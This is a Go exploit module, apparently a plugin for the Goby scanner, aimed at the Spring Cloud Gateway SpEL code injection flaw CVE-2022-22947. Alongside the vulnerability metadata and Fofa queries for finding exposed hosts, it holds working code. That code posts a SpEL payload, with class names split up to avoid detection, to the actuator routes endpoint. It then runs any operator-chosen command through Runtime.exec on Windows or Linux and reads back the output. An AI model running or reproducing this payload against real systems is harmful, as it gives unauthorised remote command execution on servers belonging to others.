package exploits

import (
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "strings"
)

func init() {
    expJson := `{
    "Name": "Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)",
    "Description": "<p>Spring Cloud Gateway is the second-generation gateway framework officially launched by Spring Cloud, replacing the Zuul gateway. As the traffic, the gateway plays a very important role in the microservice system. The common functions of the gateway include routing and forwarding, permission verification, and current limiting control.</p><p>Applications using Spring Cloud Gateway in the version prior to 3.1.0 and 3.0.6, are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.</p>",
    "Impact": "Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://tanzu.vmware.com/security/cve-2022-22947\">https://tanzu.vmware.com/security/cve-2022-22947</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Spring Cloud Gateway",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Spring Cloud Gateway Actuator API SpEL 代码注入漏洞 (CVE-2022-22947)",
            "Description": "<p>Spring Cloud Gateway是Spring Cloud官方推出的第二代网关框架，取代Zuul网关。网关作为流量的，在微服务系统中有着非常作用，网关常见的功能有路由转发、权限校验、限流控制等作用。</p><p>在 3.1.0 和 3.0.6 之前的版本中使用 Spring Cloud Gateway 的应用程序在启用、暴露和不安全的 Gateway Actuator 端点时容易受到代码注入攻击。远程攻击者可以发出恶意制作的请求，允许在远程主机上进行任意远程执行。</p>",
            "Impact": "<p>在 3.1.0 和 3.0.6 之前的版本中使用 Spring Cloud Gateway 的应用程序在启用、暴露和不安全的 Gateway Actuator 端点时容易受到代码注入攻击。远程攻击者可以发出恶意制作的请求，允许在远程主机上进行任意远程执行。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://tanzu.vmware.com/security/cve-2022-22947\">https://tanzu.vmware.com/security/cve-2022-22947</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Spring Cloud Gateway",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)",
            "Description": "<p>Spring Cloud Gateway is the second-generation gateway framework officially launched by Spring Cloud, replacing the Zuul gateway. As the traffic, the gateway plays a very important role in the microservice system. The common functions of the gateway include routing and forwarding, permission verification, and current limiting control.</p><p>Applications using Spring Cloud Gateway in the version prior to 3.1.0 and 3.0.6, are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.</p>",
            "Impact": "Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://tanzu.vmware.com/security/cve-2022-22947\">https://tanzu.vmware.com/security/cve-2022-22947</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Spring Cloud Gateway",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "((header=\"Server: Netty@SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\")) && body!=\"couchdb\") || title=\"SpringBootAdmin-Server\" || body=\"SpringBoot\"",
    "GobyQuery": "((header=\"Server: Netty@SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\")) && body!=\"couchdb\") || title=\"SpringBootAdmin-Server\" || body=\"SpringBoot\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://spring.io/",
    "DisclosureDate": "2022-03-03",
    "References": [
        "https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-22947"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10258"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            RandName := strings.ToLower(goutils.RandomHexString(8))
            uri1 := "/actuator/gateway/routes/" + RandName
            cfg1 := httpclient.NewPostRequestConfig(uri1)
            cfg1.VerifyTls = false
            cfg1.FollowRedirect = false
            cfg1.Header.Store("Content-Type", "application/json")
            cfg1.Data = fmt.Sprintf("{\r\n\"id\": \"%s\",\r\n\"filters\": [{\r\n \"name\": \"AddResponseHeader\",\r\n \"args\": {\r\n   \"name\": \"Result\",\r\n   \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),(T(java.lang.System).getProperty(\\\"os.name\\\").toLowerCase().contains(\\\"win\\\")?new String[]{\\\"cmd\\\", \\\"/c\\\", \\\"whoami\\\"}:new String[]{\\\"/bin/bash\\\", \\\"-c\\\", \\\"whoami\\\"})).getInputStream()))}\"\r\n }\r\n}],\r\n\"uri\": \"http://example.com\"\r\n}", RandName)
            if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil && resp1.StatusCode == 201 {
                uri2 := "/actuator/gateway/refresh"
                cfg2 := httpclient.NewPostRequestConfig(uri2)
                cfg2.VerifyTls = false
                cfg2.FollowRedirect = false
                cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                httpclient.DoHttpRequest(u, cfg2)
                uri3 := "/actuator/gateway/routes/" + RandName
                cfg3 := httpclient.NewGetRequestConfig(uri3)
                cfg3.VerifyTls = false
                cfg3.FollowRedirect = false
                cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
                    uri4 := "/actuator/gateway/routes/" + RandName
                    cfg4 := httpclient.NewRequestConfig("DELETE", uri4)
                    cfg4.VerifyTls = false
                    cfg4.FollowRedirect = false
                    cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                    httpclient.DoHttpRequest(u, cfg4)
                    return resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "AddResponseHeader")
                }
            }
            return false
        },
        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            cmd := ss.Params["cmd"].(string)
            RandName := strings.ToLower(goutils.RandomHexString(8))
            uri1 := "/actuator/gateway/routes/" + RandName
            cfg1 := httpclient.NewPostRequestConfig(uri1)
            cfg1.VerifyTls = false
            cfg1.FollowRedirect = false
            cfg1.Header.Store("Content-Type", "application/json")
            cfg1.Data = fmt.Sprintf("{\r\n\"id\": \"%s\",\r\n\"filters\": [{\r\n \"name\": \"AddResponseHeader\",\r\n \"args\": {\r\n   \"name\": \"Result\",\r\n   \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"ex\\\"+\\\"ec\\\",T(String[])).invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\").getMethod(\\\"getRu\\\"+\\\"ntime\\\").invoke(T(String).getClass().forName(\\\"java.l\\\"+\\\"ang.Ru\\\"+\\\"ntime\\\")),(T(java.lang.System).getProperty(\\\"os.name\\\").toLowerCase().contains(\\\"win\\\")?new String[]{\\\"cmd\\\", \\\"/c\\\", \\\"%s\\\"}:new String[]{\\\"/bin/bash\\\", \\\"-c\\\", \\\"%s\\\"})).getInputStream()))}\"\r\n }\r\n}],\r\n\"uri\": \"http://example.com\"\r\n}", RandName, cmd, cmd)
            if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && resp1.StatusCode == 201 {
                uri2 := "/actuator/gateway/refresh"
                cfg2 := httpclient.NewPostRequestConfig(uri2)
                cfg2.VerifyTls = false
                cfg2.FollowRedirect = false
                cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                httpclient.DoHttpRequest(expResult.HostInfo, cfg2)
                uri3 := "/actuator/gateway/routes/" + RandName
                cfg3 := httpclient.NewGetRequestConfig(uri3)
                cfg3.VerifyTls = false
                cfg3.FollowRedirect = false
                cfg3.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
                    uri4 := "/actuator/gateway/routes/" + RandName
                    cfg4 := httpclient.NewRequestConfig("DELETE", uri4)
                    cfg4.VerifyTls = false
                    cfg4.FollowRedirect = false
                    cfg4.Header.Store("Content-Type", "application/x-www-form-urlencoded")
                    expResult.Output = resp3.RawBody
                    expResult.Success = true
                    httpclient.DoHttpRequest(expResult.HostInfo, cfg4)
                }
            }
            return expResult
        },
    ))
}
